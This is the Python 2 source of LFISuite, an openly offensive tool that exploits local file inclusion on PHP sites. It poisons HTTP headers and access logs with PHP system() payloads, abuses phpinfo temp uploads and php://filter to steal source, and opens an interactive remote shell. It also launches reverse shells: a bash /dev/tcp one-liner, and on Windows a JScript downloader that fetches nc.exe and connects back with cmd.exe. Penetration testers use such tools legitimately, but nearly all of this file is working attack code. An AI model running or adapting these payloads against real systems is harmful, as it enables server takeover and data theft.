# LFISuite: LFI Automatic Exploiter and Scanner
# Author: D35m0nd142, <d35m0nd142@gmail.com>
# Twitter: @D35m0nd142
# Python version: 2.7
# Tutorial Video: https://www.youtube.com/watch?v=6sY1Skx8MBc
# Github Repository: https://github.com/D35m0nd142/LFISuite

#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import re
import sys
import urllib
import subprocess

def download(file_url,local_filename):
	web_file = urllib.urlopen(file_url)
	local_file = open(local_filename, 'w')
	local_file.write(web_file.read())
	web_file.close()
	local_file.close()

def solve_dependencies(module_name,download_url=None):
	try:
		from pipper import pip_install_module
	except:
		print "[!] pipper not found in the current directory.. Downloading pipper.."
		download("https://raw.githubusercontent.com/D35m0nd142/LFISuite/master/pipper.py","pipper.py")
		from pipper import pip_install_module

	if(download_url is not None):
		print "\n[*] Downloading %s from '%s'.." %(module_name,download_url) 
		download(download_url,module_name)
		if(sys.platform[:3] == "win"): # in case you are using Windows you may need to install an additional module
			pip_install_module("win_inet_pton")
	else:
		pip_install_module(module_name)

import time
import socket
import codecs
import base64
import urllib
import shutil

try:
	import requests
except:
	solve_dependencies("requests")
	import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

try:
	import socks
except:
	solve_dependencies("socks.py","https://raw.githubusercontent.com/D35m0nd142/LFISuite/master/socks.py")
	import socks

import threading
from random import randint

try:
	from termcolor import colored
except:
	solve_dependencies("termcolor")
	from termcolor import colored

netcat_url = "https://github.com/D35m0nd142/LFISuite/raw/master/nc.exe"
LFS_VERSION = '1.13' # DO NOT MODIFY THIS FOR ANY REASON!!

#--------- Auto-Hack Global Variables ----------#
ahactive     = False
ahurl        = ""
ahenvurl     = ""
ahlogurl     = ""
ahfdurl      = ""
ahwebsite    = ""
ahfd_errPage = ""
ahpath       = ""
ahpaths      = []
ahlogs       = []
ahfd         = []
ahenv        = []
ahcnf        = []
ahgen        = []
#-----------------------------------------------#

# ------------------ Reverse shell ------------------ #

# for Windows
wget_filename = ""
nc_filename   = ""
wget_js_content = ""

# for Windows
def initWindowsReverse():
	global wget_filename
	global wget_js_content
	global nc_filename

	if(len(wget_filename) > 0 and len(nc_filename) > 0):
		return False

	wget_num = generateRandom()[11:]
	nc_num   = generateRandom()[11:]
	wget_js_content = """var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);WinHttpReq.Send();BinStream = new ActiveXObject("ADODB.Stream");BinStream.Type = 1;BinStream.Open();BinStream.Write(WinHttpReq.ResponseBody);BinStream.SaveToFile("nc_%s.exe");""" %nc_num
	wget_filename = "lfisuite_wget_%s.js" %wget_num
	nc_filename = "nc_%s" %nc_num

	return True

reverseConn = "bash -i >& /dev/tcp/?/12340 0>&1" # pentest monkey's bash reverse shell
victimOs = ""

def windows_reverse_shell():
	global reverseConn

	if("?" in reverseConn):
		print colored("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.","red")
		time.sleep(2)
		ipBack   = raw_input("\n[*] Enter the IP address to connect back to -> ")
		portBack = raw_input("[*] Enter the port to connect to [default: 12340] -> ")
		if(len(portBack) == 0):
			portBack = 12340
		reverseConn = "%s -nv %s %s -e cmd.exe" %(nc_filename,ipBack,portBack)

def generic_reverse_shell():
	global reverseConn

	if("?" in reverseConn):
		print colored("[WARNING] Make sure to have your netcat listening ('nc -lvp port') before going ahead.","red")
		time.sleep(2)
		ipBack   = raw_input("\n[*] Enter the IP address to connect back to -> ")
		portBack = "notValidPort"
		while(len(portBack) > 0 and (portBack.isdigit() is False or int(portBack) > 65535)):
			portBack = raw_input("[*] Enter the port to connect to [default: 12340] -> ")
		if(len(portBack) == 0):
			portBack = 12340
		reverseConn = "bash -i >& /dev/tcp/%s/%s 0>&1" %(ipBack,portBack)

def checkIfReverseShell(cmd):
	if(cmd == "reverse shell" or cmd == "reverseshell"):
		return True
	return False

def checkIfWindows(path):
	if(victimOs == "Windows" or (len(path) > 0 and "\windows\system32" in path.lower())): 
		print colored("\n[+] OS: Windows\n","white")
		return True
	return False
# ----------------------------------------------------#

#-------------------------------------------------------------------Generic------------------------------------------------------------#
gen_headers = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201',
		   	  'Accept-Language':'en-US;',
		   	  'Accept-Encoding': 'gzip, deflate',
		   	  'Accept': 'text/html,application/xhtml+xml,application/xml;',
		   	  'Connection':'close'}

def banner():

	os.system('cls' if os.name == 'nt' else 'clear')
	print """

                         .//// *,                                 ,//// *,
             .///////////*//** //            ,*. ,                ////* .                 .,, ..
  ,*///* /.   *//////////. .,,../         ,*/////,.*         *///*  .,,.*/////////// * ,//////./,
   .///* (,   *////    **.////,.(.       */////*,  *///* /. ./////*////,*//////////* */////*. ,#*
    ///* (,   *///*       ////,,(.       *///////*.////* (, ,////*.////,.( *///*.%% *////////* (,
   .###/ (,   */////////. ////.*(.      .. ,*//////*////./* *////*.////.*/ *///**(, /(((#####/ #,
   ,###/ (,   (########/  #### (/.        . ,####( ,####(.,(####/ ,#### (* (###.(/. .#####/*.  #,
   *###/..,/(*(###/   ** ,#### (/          /####/ * (###########  *#### (..###( #/. . *######/, *
   /########/.####**#*/( *###( #*        *#####. %(,./#######(, # (###( # *###/ #*   ., .*####/.(.
   /########/ ####,/(.   //,  (#*       ,*/((, ##/. .   ...  ,%#/ (/,  (#     /#/.      ,*  ,/./(.
   .********, /*. .#/   .*##(/,.        ,/(###(*.     .,*****,.  ./##(/,. .,**,.           .*/(/,     v 1.13
             ./#(/*.

	"""

	print "/*-------------------------------------------------------------------------*\\"
	print "| Local File Inclusion Automatic Exploiter and Scanner + Reverse Shell      |"
	print "|                                                                           |"
	print "| Modules: AUTO-HACK, /self/environ, /self/fd, phpinfo, php://input,        |"
	print "|          data://, expect://, php://filter, access logs                    |"
	print "|                                                                           |"
	print "| Author: D35m0nd142, <d35m0nd142@gmail.com> https://twitter.com/d35m0nd142 |"
	print "\*-------------------------------------------------------------------------*/\n"


def check_for_update():
	lfisuite_github_url = "https://raw.githubusercontent.com/D35m0nd142/LFISuite/master/lfisuite.py"
	keyword = "LFS_VERSION = '"
	updated = False
	print "\n[*] Checking for LFISuite updates.."
	time.sleep(1)

	try:
		lfisuite_content = requests.get(lfisuite_github_url,headers=gen_headers).text
		currversion_index = SubstrFind(lfisuite_content,keyword)[0]
		lfisuite_content = lfisuite_content[(currversion_index+len(keyword)):]

		currversion = ""
		for c in lfisuite_content:
			if c == '\'':
				break
			currversion = "%s%s" %(currversion,c)

		fcurrversion = float(currversion)
		if(fcurrversion > float(LFS_VERSION)):
			updated = True
			print "[+] New LFISuite version found. Updating.."
			download(lfisuite_github_url,sys.argv[0])
			print colored("\n[+] LFISuite updated to version %s" %currversion,"red")
			print "[i] Visit https://github.com/D35m0nd142/LFISuite/blob/master/CHANGELOG.md for details"
			time.sleep(2)
			os.system("%s %s" %(sys.executable,sys.argv[0]))
		else:
			print "[-] No updates available.\n"
	except:
		print "\n[-] Problem while updating."

	if updated:
		sys.exit(0)

# this is needed by access_log and passthru
class NoURLEncodingSession(requests.Session):
    def send(self, *a, **kw):
        a[0].url = a[0].url.replace(urllib.quote("<"), "<")
        a[0].url = a[0].url.replace(urllib.quote(" "), " ")
        a[0].url = a[0].url.replace(urllib.quote(">"), ">")
        return requests.Session.send(self, *a, **kw)

def printChoice(choice):
	if("Auto Hack" in choice):
		print colored("\n.:: %s ::.\n" %choice, "red")
	else:
		print colored("\n.:: %s Injection ::.\n" %choice, "red")

def extractWebsiteFromUrl(url):
	# Pre: url contains http:// or https:// declaration
	splits = url.split('/')
	return "%s//%s" %(splits[0],splits[2])

def getHTTPWebsite(ourl): # http://127.0.0.1/dvwa/test.php --> http://127.0.0.1
	split = ourl.split("/")
	return "%s//%s" %(split[0],split[2])

def removeHttpFromWebsite(website):
	if("http://" in website or "https://" in website):
		splits = website.split('/')
		return splits[2]
	return website

def checkHttp(url):
	if("http://" not in url and "https://" not in url):
		return "http://%s" %url
	return url

def isUnknown(par):
	if(len(par) < 2 or len(par) > 120):
		return "?"
	return par

def SubstrFind(resp, toFind):
	if(len(toFind) > len(resp)):
		return []

	found = False
	indexes = []

	for x in range(0,(len(resp)-len(toFind))+1):
		if(ord(resp[x]) == ord(toFind[0])):
			found = True
			for i in range(0,len(toFind)):
				if(ord(resp[x+i]) != ord(toFind[i])):
					found = False
					break
		if(found):
			indexes.append(x)
			found = False
			x += len(toFind)

	return indexes

def extractPathFromPaths():
	global ahpaths

	if len(ahpaths) == 0:
		return "<NOT APPLICABLE>"

	first = ahpaths[0]
	equals = SubstrFind(first, "=")
	index = equals[len(equals)-1]+1
	nfirst = first[index:]
	tmp = ""

	for c in nfirst:
		if c != '.' and c != "/":
			break
		tmp += c

	if len(tmp) > 0:
		tmp = tmp[:-1]

	return tmp

def cutURLToLastEqual(url):
	indexes = SubstrFind(url,"=")
	return url[0:indexes[len(indexes)-1]+1]

def extractPathFromUrl(url):
	# Pre: url contains http:// or https:// declaration
	slashes = SubstrFind(url,"/")
	return url[(slashes[2]):]

def correctUrl(url): # ex: 'http://127.0.0.1/lfi.php?file=/etc/passwd' --> 'http://127.0.0.1/lfi.php?file='
	if(url[len(url)-1] == '='):
		return url
	eq = SubstrFind(url,"=")
	if(len(eq) == 0):
		print "\n[ERROR] Invalid URL syntax!\n"
		sys.exit()
	last = eq[len(eq)-1]

	return url[:(last+1)]

def checkFilename(filename): # useful in case of drag and drop
	while(True):
		if(len(filename) > 0):
			if(filename[0] == '\''): 
				filename = filename[1:]
			if(filename[len(filename)-1] == '\''): 
				filename = filename[:-1]
			if(os.path.exists(filename)):
				return filename
		filename = raw_input("[!] Cannot find '%s'.\n[*] Enter a valid name of the file containing the paths to test -> " %filename) 

def showInterestingPath(toPrint,stack):
	print " %s: [%s]" %(toPrint,len(stack))
	bar = "-" * 90
	print bar
	for path in stack:
		print path
	print "%s\n" %bar

def generateRandom():
	return "AbracadabrA%s" %randint(40,999999)

def onlyPhpPrint():
	print colored("[system() calls have been disabled by the website, you can just run php commands (ex: fwrite(fopen('a.txt','w'),\"content\");]\n","red")

def invalidChoice():
 	print colored("\n[Error] You entered an invalid choice!\n","red")
	
def exit():
	print "\nBye ;-)\n"
	sys.exit(0)

#--------------------------------------------------------------/proc/self/environ------------------------------------------------------
se_url = ""
se_par = ""
se_stopStr = ""
se_header_par = ""
se_phponly = False
se_header_pars = ["HTTP_USER_AGENT","HTTP_ACCEPT","HTTP_ACCEPT_ENCODING","HTTP_ACCEPT_LANGUAGE","HTTP_REFERER","HTTP_CONNECTION","HTTP_COOKIE"]
se_header_conv = ["User-Agent","Accept","Accept-Encoding","Accept-Language","Referer","Connection","Cookie"]
se_headers = gen_headers

def se_reverse_shell():
	generic_reverse_shell()
	print cleanOutput(execSeCmd(correctString(reverseConn)), False)

def getTranslatedPar(word):
	global se_header_conv
	global se_header_pars

	for i in range(0,len(se_header_pars)):
		if(word == se_header_pars[i]):
			return se_header_conv[i]

def printSwitchUA():
	print "\n[!] The choice you made is not acceptable. Switching to HTTP_USER_AGENT."

def setHttpCookie():
	global se_headers

	print "\n[Warning] In order to get the program working you need to provide a value for HTTP_COOKIE parameter."
	print "Why? Before injecting I perform a quick test to figure out how the web response is structured and how parameters are shown."
	cookie_val = raw_input("\nHTTP_COOKIE (default: 'nope') -> ")
	if(len(cookie_val) == 0):
		cookie_val = "nope"
	se_headers['Cookie'] = cookie_val

def chooseSe_Par():
	global se_par

	if(ahactive is False):
		print "\nChoose the parameter you prefer to inject"
		print "-------------------------------"
		for i in range(0,len(se_header_pars)):
			print " %s) %s" %(i+1,se_header_pars[i])
		print " 8) AUTO-HACK"
		print "-------------------------------"
		try:
			choice = input(" -> ")
		except:
			printSwitchUA()
			choice = 1
	else:
		choice = 8

	if(choice < 1 or choice > 8):
		printSwitchUA()
		time.sleep(1)
		se_par = se_header_pars[0]
	if(choice == 8): # auto Hacking module
		return True
	else:
		se_par = se_header_pars[choice-1]
		if(se_par == "HTTP_COOKIE"):
			setHttpCookie()

	return False

def cleanOutput(output, newline):
	output = output.replace("\r","").replace("%c" %chr(0), "").replace("\t","") # chr(0)=NUL
	if(newline):
		output = output.replace("\n","")
		
	return output

def execSeCmd(cmd):
	global se_par
	global se_headers

	if(se_phponly is False):
		se_headers['%s' %se_header_par] = '<?php system("%s"); ?>' %cmd
	else:
		if(";" not in cmd[-2:]):
			cmd = "%s;" %cmd
		se_headers['%s' %se_header_par] = '<?php %s ?>' %cmd
	#print "se_headers = %s\n---------" %se_headers # useful for debugging
	if(cmd != reverseConn):
		r = requests.get(se_url, headers=se_headers, timeout=15, verify=False)
	else:
		r = requests.get(se_url, headers=se_headers, verify=False)
	resp = r.text

	'''print "\nse_headers:\n%s\n\n" %se_headers
	print "\n\n-------------\n%s\n-------------\n\n" %resp'''
	index_start = SubstrFind(resp, "%s=" %se_par)
	index_stop = SubstrFind(resp, se_stopStr)

	try:
		return resp[(index_start[0]+len(se_par)+1):index_stop[0]]
	except:
		return "<NOT WORKING>"

def restoreVars():
	global se_par
	global se_header_par
	global se_headers
	global se_stopStr

	se_headers = gen_headers
	se_par = ""
	se_stopStr = ""
	se_header_par = ""

def correctString(s):
	correct = ""
	for c in s:
		if(c == '"'):
			correct += "\\"
		correct += c
	return correct

def se_fail(par):
	print "\n[-] LFI did not work over the parameter '%s'." %se_par
	if(par == "None"):
		print "[ADVICE] Run the Auto-Hack module to see if the other parameters are vulnerable (it happens!) :-)\n"

def hackSE(par):
	global se_par
	global se_header_pars
	global se_header_par
	global se_headers
	global se_stopStr
	global se_phponly

	if(par != "None"):
		se_par = par
	se_header_par = getTranslatedPar(se_par)

	r = requests.get(se_url, headers=se_headers, timeout=15, verify=False)
	resp = r.text

	if("%s=" %se_par in resp):
		stop = ""
		fields = resp.split('=')
		for x in range(0,len(fields)):
			if(se_par in fields[x]):
				if(x+1 < len(fields)):
					stop = fields[x+1]
				break

		if(len(stop) > 0):
			for i in reversed(stop):
				if(i.isupper() is False and i != '_'):
					break
				se_stopStr += i
			se_stopStr = "%s=" %(se_stopStr[::-1])
	else:
		print "\n[!] Unfortunately the parameter '%s' is not contained in the web response.\n" %se_par
		if(par != "None"):
			return
		sys.exit(0)

	output = execSeCmd("id")

	if("uid=" in output or "gid=" in output or "Usage of id by" in output):
		print colored("\n[+] LFI Worked! :-)","red")
		print colored("[*] Opening a system shell...\n","white")

		whoami = cleanOutput(execSeCmd("whoami"), True)
		pwd = cleanOutput(execSeCmd("pwd"), True)
	 	shell_host = removeHttpFromWebsite(extractWebsiteFromUrl(se_url))

		cmd = ""
		while(cmd != "exit" and cmd != "quit"):
			cmd = raw_input("%s@%s:%s$ " %(whoami, shell_host, pwd))
			if(cmd != "exit" and cmd != "quit"):
				if(checkIfReverseShell(cmd)):
					se_reverse_shell()
				else:
					got = cleanOutput(execSeCmd(correctString(cmd)), False)
				if("<NOT WORKING>" not in got):
					print got
		exit()
	else:
		# test in case system() calls have been disabled #
		#-------------#
		if("system() has been disabled for security reasons in" in output):
			se_phponly = True
			rand_str = generateRandom()
			output = execSeCmd("echo %s;" %rand_str)
			if(rand_str in output and ("echo %s" %rand_str) not in output and ("echo%%20%s" %rand_str) not in output):
				print colored("\n[+] LFI Worked! :-)","red")
				print colored("[*] Opening a shell...","white")
				onlyPhpPrint()
				print colored("[WARNING] All occurences of \" will be replaced with '.\n","white")
				cmd = ""
				whoami = isUnknown(execSeCmd("get_current_user();"))
				pwd = isUnknown(execSeCmd("getcwd();"))
				shell_host = removeHttpFromWebsite(extractWebsiteFromUrl(se_url))

				while(cmd != "exit" and cmd != "quit"):
					cmd = raw_input("%s@%s:%s$ PHP:// " %(whoami, shell_host, pwd))
					cmd = cmd.replace('"','\'')
					if(cmd != "exit" and cmd != "quit"):
						got = cleanOutput(execSeCmd(correctString(cmd)), False)
						if("<NOT WORKING>" not in got):
							print got
				if(ahactive):
					cont = raw_input("\n[*] Do you want to try even the other attacks? (y/n) ")
					if(cont == "n" or cont == "N"):
						exit()
				else:
					exit()
			else:
				se_fail(par)
		#-------------#
		else:
			se_fail(par)

def run_self_environ():
	global se_url
	global se_headers
	global se_header_pars
	global ahactive
	global ahenvurl

	if(ahactive is False):
		se_url = raw_input("\n[*] Enter the /proc/self/environ vulnerable URL -> ") 
	else:
		se_url = ahenvurl

	se_url = checkHttp(se_url)
	se_headers['Referer'] = extractWebsiteFromUrl(se_url)
	auto = chooseSe_Par()

	if(auto is False):
		hackSE("None")
	else:
		for i in range(0,7):
			restoreVars()
			print colored("\n[*] Trying to inject '%s'" %se_header_pars[i],"white")
			if(i == 6):
				setHttpCookie()
			hackSE(se_header_pars[i])

#----------------------------------------------------------------------------------------------------------------------------------------#

#-------------------------------------------------------------PHPInfo Injection----------------------------------------------------------#
phpinfo_reverse = False

def windows_phpinfo_reverse_shell(headers,lfipath,phpinfopath,host):
	if(initWindowsReverse()):
		cmd = "echo %s > %s" %(wget_js_content, wget_filename)
		phpinfo_request(headers,cmd,lfipath,phpinfopath,0,host)
		cscript = "cscript /nologo %s %s" %(wget_filename,netcat_url)
		phpinfo_request(headers,cscript,lfipath,phpinfopath,0,host)

	windows_reverse_shell()
	print phpinfo_request(headers,reverseConn,lfipath,phpinfopath,0,host)

def phpinfo_reverse_shell(headers,lfipath,phpinfopath,host):
	generic_reverse_shell()
	print phpinfo_request(headers,reverseConn,lfipath,phpinfopath,0,host)

def phpinfo_ext(content):
	indexes = SubstrFind(content, "AbracadabrA")
	found = len(indexes) > 0
	got = ""

	if(found):
		start = indexes[0]+11
		for x in range(start, len(content)):
			if(content[x] == '<'):
				break
			got += content[x]

	return got

def phpinfo_request(headers,cmd,path1,path,test,host): 
	rcvbuf = 1024
	bigz = 3000
	junkheaders = 30
	junkfiles = 40
	junkfilename = '>' * 100000
	z = "Z" * bigz
	found = 0

	phpinfo_headers = {'User-Agent':'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:2.0b8) Gecko/20100101 Firefox/4.0b8',
			   	  'Accept-Language':'en-us,en;q=0.5',
			   	  'Accept-Encoding': 'gzip, deflate',
			   	  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
				  'Accept-Charset': 'windows-1251,utf-8;q=0.7,*;q=0.7',
				  'z': z,
			   	  'Connection':'close'}

	if "Cookie" in gen_headers:
		phpinfo_headers['Cookie'] = gen_headers['Cookie']

	loop = range(0,junkheaders)
	for count in loop:
		phpinfo_headers['z%s' %count] = count

	phpinfo_headers['Content-Type'] = 'multipart/form-data; boundary=---------------------------59502863519624080131137623865'

	if("php://" in cmd):
		cmd = cmd[6:]
	else:
		cmd = "system('%s')" %cmd
	if(";" not in cmd[-2:]):
		cmd = "%s;" %cmd

	content = """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="tfile"; filename="test.html"\nContent-Type: text/html\n\nAbracadabrA <?php %s ?>\n-----------------------------59502863519624080131137623865--""" %(cmd)
	loop = range(0,junkfiles)

	for count in loop:
		content = content + """-----------------------------59502863519624080131137623865\nContent-Disposition: form-data; name="ffile%d"; filename="%d%s"\nContent-Type: text/html\n\nno\n-----------------------------59502863519624080131137623865--\n""" %(count,count,junkfilename)

	phpinfo_headers['Content-Length'] = '%s' %(len(content))
	got = ""
	url = "%s%s" %(host,path)

	try:
		if(phpinfo_reverse):
			r = requests.post(url=url, headers=phpinfo_headers, data=content)
		else:
			r = requests.post(url=url, headers=phpinfo_headers, data=content, timeout=20)
	except:
		return got

	resp = r.text
	if("tmp_name" in resp):
		found = 1
		lines = resp.split('\n')
		for line in lines:
			if "tmp_name]" in line:
				mystr = str(line)
				array = mystr.split()
				tmp_name = array[2]
				#print "tmp_name = '%s'" %tmp_name
				break

		tmp_url = "%s%s%s" %(host,path1,tmp_name)
		r = requests.get(tmp_url,headers=gen_headers,timeout=15, verify=False)
		content = r.content
		#print "content: \n%s\n\n" %content
		got = phpinfo_ext(content)

	return got

def run_phpinfo():
	global phpinfo_reverse
	global victimOs

	if(ahactive is False):
		host = raw_input("[*] Enter the website without path (ex: 'http://justsitename') -> ")
		lfipath = raw_input("[*] Enter the vulnerable LFI path (ex: '/lfi.php?file=../..') -> ")
	else:
		host = ahwebsite
		lfipath = ahpath

	phpinfopath = raw_input("[*] Enter the phpinfo path (ex: '/path/info.php') -> ")
	'''host = "http://192.168.1.151"
	lfipath = "/lfi/lfi.php?page="
	phpinfopath = "/lfi/phpinfo.php"'''

	headers = ""
	rand_str = generateRandom()
	cmd = "echo %s" %rand_str
	print "\n[*] Generating the request.. wait please.."
	found = phpinfo_request(headers,cmd,lfipath,phpinfopath,1,host)

	if(len(found) > 0 and rand_str in found):
	    print colored("\n[+] The website seems to be vulnerable. Opening a system Shell..","white")
	    time.sleep(0.5)
	    print colored("[If you want to send PHP commands rather than system commands add php:// before them (ex: php:// fwrite(fopen('a.txt','w'),\"content\");]\n","red")

	    whoami = isUnknown(cleanOutput(phpinfo_request(headers,"whoami",lfipath,phpinfopath,0,host), True).replace(" ",""))
	    pwd = isUnknown(cleanOutput(phpinfo_request(headers,"pwd",lfipath,phpinfopath,0,host), True).replace(" ", ""))

	    if(pwd == "?"):
			path = cleanOutput(phpinfo_request(headers,"path",lfipath,phpinfopath,0,host), True).replace(" ","")
			if(checkIfWindows(path)):
				victimOs = "Windows"
				pwd = cleanOutput(phpinfo_request(headers,"cd",lfipath,phpinfopath,0,host), True).replace(" ","")

	    shell_host = removeHttpFromWebsite(host)

	    while(cmd != "exit" and cmd != "quit"):
	    	cmd = raw_input("%s@%s:%s$ " %(whoami,shell_host,pwd))
	    	if(cmd != "exit" and cmd != "quit"):
	    		if(checkIfReverseShell(cmd)):
					phpinfo_reverse = True
					if(victimOs == "Windows"):
						windows_phpinfo_reverse_shell(headers,lfipath,phpinfopath,host)
					else:
						phpinfo_reverse_shell(headers,lfipath,phpinfopath,host)
	    		else:
		    		print phpinfo_request(headers,cmd,lfipath,phpinfopath,0,host)
	    exit()
	else:
		rand_str = generateRandom()
		found = phpinfo_request(headers,"php://echo %s" %rand_str,lfipath,phpinfopath,1,host)
		if(rand_str in found):
			print colored("\n[+] The website seems to be vulnerable. Opening a Shell..","white")
			time.sleep(0.5)
			onlyPhpPrint()

			whoami = isUnknown(cleanOutput(phpinfo_request(headers,"php://get_current_user()",lfipath,phpinfopath,0,host), True).replace(" ",""))
			pwd = isUnknown(cleanOutput(phpinfo_request(headers,"php://getcwd()",lfipath,phpinfopath,0,host), True).replace(" ", ""))
			shell_host = removeHttpFromWebsite(host)

	    	while(cmd != "exit" and cmd != "quit"):
	    		cmd = raw_input("%s@%s:%s$ PHP:// " %(whoami,shell_host,pwd))
	    		if(cmd != "exit" and cmd != "quit"):
	    			print phpinfo_request(headers,"php://"+cmd,lfipath,phpinfopath,0,host)
	    	exit()

#----------------------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------PHP://Filter-------------------------------------------------------------#
def base64_check(c):
    t = ord(c)
    if((t >= 65 and t <= 90) or (t >= 97 and t <= 122) or (t >= 48 and t <= 57) or (t == 43) or (t == 47) or (t == 61)):
    	return True;
    return False;

def phpfilter_extract(content):
	ftemp = ""
	found = []

	lines = content.split('\n')
	for line in lines:
		ftemp = ""
		length = len(line)

		for x in range(0,length):
			if(base64_check(line[x])):
				ftemp += line[x]
			else:
				if(length > 100 and base64_check(line[x]) is False and len(ftemp) >= (length/2)):
					break
				ftemp = ""

		if(len(ftemp) > 0):
			found.append(ftemp)

	final = ""
	if(len(found) > 50):
		maxim = 0
		index = -1
		for x in range(0,len(found)):
			length = len(found[x])
			if(length > maxim):
				maxim = length
				index = x
		final = found[x]

	return final

def run_phpfilter():
	global ahactive
	global ahurl

	if(ahactive is False):
		ofilterurl = raw_input("[*] Enter the php://filter vulnerable url (ex: 'http://site/index.php?page=') -> ")
	else:
		ofilterurl = ahurl

	ofilterurl = correctUrl(ofilterurl)
	ofilterurl = checkHttp(ofilterurl)

	filterpage = "1"
	while(True):
		filterpage = raw_input("[*] Enter the page you want to steal information of ['0' to exit] -> ")
		if(filterpage == "0"):
			break
		filterurl = "%sphp://filter/convert.base64-encode/resource=%s" %(ofilterurl,filterpage)
		r = requests.get(filterurl,headers=gen_headers,timeout=15, verify=False)
		filtercontent = r.text

		found = phpfilter_extract(filtercontent)

		if(len(found) == 0):
			print "[-] Any interesting Base64 code found :("
		else:
			see = raw_input("[+] Found possible interesting Base64 code. Do you want me to show it? (y/n) ")
			if(see == "y" or see == "Y" or see == "yes"):
				print "-------------------------------------------------------------------------------------------------------------------------"
				print "%s" %found
				print "-------------------------------------------------------------------------------------------------------------------------\n"

			decode = raw_input("[*] Do you want me to decode it? (y/n) ")
			if(decode == "y" or decode == "Y" or decode == "yes"):
				decoded = base64.b64decode(found)
				print "\n\n--Decoded text-----------------------------------------------------------------------------------------------------------\n"
				print "%s" %decoded
				print "\n-------------------------------------------------------------------------------------------------------------------------\n"

		print ""

#----------------------------------------------------------------------------------------------------------------------------------------#

#---------------------------------------------------------------Access_Log---------------------------------------------------------------#
access_log_reverse = False

def access_log_windows_reverse_shell(host,keyword,ologurl):
	global access_log_reverse

	access_log_reverse = True
	if(initWindowsReverse()):
		cmd = "echo %s > %s" %(wget_js_content, wget_filename)
		send_access_log_cmd(cmd, host, keyword)
		cscript = "cscript /nologo %s %s" %(wget_filename,netcat_url)
		send_access_log_cmd(cscript, host, keyword)

	windows_reverse_shell()
	send_access_log_cmd(reverseConn, host, keyword)
	print cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), False)

def access_log_reverse_shell(host,keyword,ologurl):
	global access_log_reverse

	access_log_reverse = True
	generic_reverse_shell()
	send_access_log_cmd(reverseConn, host, keyword)
	print cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), False)

def access_control(resp,keyword,rand_str):
	lines = resp.split('\n')

	if("_PHP" in keyword): 	# in case system() calls have been disabled
		keyword = keyword[:-4]

	if(len(SubstrFind(resp,rand_str)) > 0 and len(SubstrFind(resp,"echo %s" %rand_str)) == 0 and
	   len(SubstrFind(resp,"echo%%20%s" %rand_str)) == 0):
		return True

	return False
	#----------------------------------------------------

def send_access_log_cmd(cmd,host,keyword):
	path = ""

	if("_PHP" in keyword):
		keyword = keyword[:-4]
		if(" " in cmd):
			b64cmd = base64.b64encode(cmd)
			path = "/<?php eval(base64_decode('%s'));?>" %(b64cmd)
		else:
			path = "/<?php %s?>" %(cmd)
	else:
		b64cmd = base64.b64encode(cmd)
		path = "/<?php system(base64_decode('%s'));?>" %(b64cmd)

	s = NoURLEncodingSession()
	url = "%s/%s" %(host,path)

	if("GET" in keyword):
		s.get(url, headers=gen_headers)
	else:
		s.head(url, headers=gen_headers)

def access_log_ext(url, keyword):
	global access_log_reverse

	if(access_log_reverse):
		r = requests.get(url,headers=gen_headers, verify=False)
	else:
		r = requests.get(url,headers=gen_headers,timeout=15, verify=False)

	resp = r.text
	get_indexes = SubstrFind(resp,keyword)

	nget = len(get_indexes)
	if(nget > 0):
		last = get_indexes[nget-1]
		toCheck = resp[(last+len(keyword)):]
		stop = SubstrFind(toCheck, " HTTP/1.1")

		if(len(stop) > 0):
			return toCheck[1:(stop[0])]
		stop = SubstrFind(toCheck, "\"")
		if(len(stop) > 0):
			return toCheck[1:(stop[0])]
	return ""

def access_log_while(whoami,logmain,pwd,ologurl,keyword,windows):
	cmd = ""
	while(cmd != "exit" and cmd != "quit"):
		cmd = raw_input("%s@%s:%s$ " %(whoami, logmain.split("/")[2], pwd))
		cmd = cmd.replace("'","\"")
		if(cmd != "exit" and cmd != "quit"):
			if(checkIfReverseShell(cmd)):
				if(windows is False):
					access_log_reverse_shell(logmain,keyword,ologurl)
				else:
					access_log_windows_reverse_shell(logmain,keyword,ologurl)
			else:
				send_access_log_cmd(cmd, logmain, keyword)
				print cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), False)
	exit()

def simpleGETorHEAD(keyword, ologurl, logmain):
	randStr = generateRandom()
	send_access_log_cmd("echo %s" %randStr, logmain, keyword)

	if(access_log_reverse):
		r = requests.get(url,headers=gen_headers, verify=False)
	else:
		r = requests.get(ologurl,headers=gen_headers,timeout=15, verify=False)

	resp = r.text
	print colored("\nTrying to inject the website using simple %s requests." %keyword, "white")

	if(access_control(resp,keyword,randStr)):
		print "[+] The website seems to be vulnerable. Opening a System Shell..\n"
		time.sleep(1)
		cmd = ""

		send_access_log_cmd("whoami", logmain, keyword)
		whoami = cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), True)
		send_access_log_cmd("pwd", logmain, keyword)
		pwd = cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), True)

		access_log_while(whoami,logmain,pwd,ologurl,keyword,False)

	# -------------------------------------------------------------------------------------------
	else:
		# check if Windows operating system
		# ----------------------------------------------------- #
		send_access_log_cmd("path",logmain,keyword)
		path = cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), True)
		time.sleep(1)

		if(checkIfWindows(path)):
			# trying to get current Windows user by using 'whoami' command
			send_access_log_cmd("whoami", logmain, keyword)
			whoami = isUnknown(cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), True))

			if("?" in whoami):
				# Try to get current_user using PHP function 'get_current_user()'
				send_access_log_cmd("get_current_user();", logmain, keyword+"_PHP")
				whoami = isUnknown(cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), True))

			send_access_log_cmd("cd", logmain, keyword)
			pwd = cleanOutput(access_log_ext(ologurl, "\"%s /" %keyword), True)
			access_log_while(whoami,logmain,pwd,ologurl,keyword,True)

